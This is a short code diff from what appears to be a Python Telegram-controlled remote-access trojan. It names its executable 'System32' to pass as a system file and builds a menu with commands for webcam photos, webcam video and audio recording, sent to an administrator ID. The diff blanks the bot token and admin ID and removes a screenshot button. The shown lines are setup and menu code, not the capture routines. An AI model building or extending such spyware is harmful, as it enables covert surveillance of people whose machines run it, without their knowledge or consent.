@@ -37,8 +37,8 @@ apihelper.proxy = {'http':'http://x.x.x.x:port'}
 fname = 'System32' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
 
 #Токен/Айди
-token = 'Токен'
-adm = 'Айди'
+token = ''
+adm = ''
 
 bot = telebot.TeleBot(token, threaded=True)
 bot.worker_pool = util.ThreadPool(num_threads=30)
@@ -46,7 +46,6 @@ bot.worker_pool = util.ThreadPool(num_threads=30)
 menu = types.ReplyKeyboardMarkup()
 button1 = types.KeyboardButton('/1\n<<')
 button2 = types.KeyboardButton('/2\n>>')
-button3 = types.KeyboardButton('/Screen\n🖼')
 button4 = types.KeyboardButton('/Webcam\n📸')
 button5 = types.KeyboardButton('/WebcamVid\n🎥')
 button6 = types.KeyboardButton('/Audio\n🎙')
